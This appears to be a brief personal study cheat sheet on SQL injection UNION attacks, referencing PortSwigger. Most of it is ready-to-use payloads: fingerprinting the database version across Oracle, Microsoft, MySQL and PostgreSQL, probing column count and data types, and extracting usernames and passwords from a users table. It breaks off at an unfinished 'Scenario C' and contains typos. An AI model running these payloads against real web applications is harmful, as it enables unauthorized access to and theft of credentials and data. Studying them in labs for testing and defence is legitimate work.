Useful cheatsheet from Port Swigger: https://portswigger.net/web-security/sql-injection/cheat-sheet
## Union Attack:
**Version Identify Attack:** this is very important because you will know later what sytnax to use for you SQL Injection payloads:
```
' UNION SELECT NULL, banner FROM v$version--  --Oracle
' UNION SELECT NULL, @@version--              --Microsoft
' UNION SELECT NULL, @@version--              --MySql
' UNION SELECT NULL, user()--                 --MySql
' UNION SELECT NULL, version()--              --PostgreSQL
```
**Step 1:** identify how `many colmuns` are returned otherwise you will get an internal error:
```
' UNION SELECT NULL, NULL--
```
**Step 2:** identify what `data type` is in each column ex: integer or string:
```
' UNION SELECT NULL, 'abcd', NULL--  #Note: if integer instead of 'abcd' just any number with no quoteslike 2
```
**Scenario A:** you already checked in Step 1 you have 2 columns so you can do the action and `retrieve data` from other tables:
```
' UNION SELECT username, password FROM users--
```
**Scenario B:** you already checked in Step 1 you have 2 columns BUT .. its not working .. you may have to `retrieve multiple values in a single column`: 
```
' UNION SELECT NULL, CONCAT(username,password) FROM users--
```
**Scenario C:**

### Oracle
to get the `version` (you may need also to make sure you have the correct number of columns)
```
' UNION SELECT BANNER, NULL FROM v$version--
```
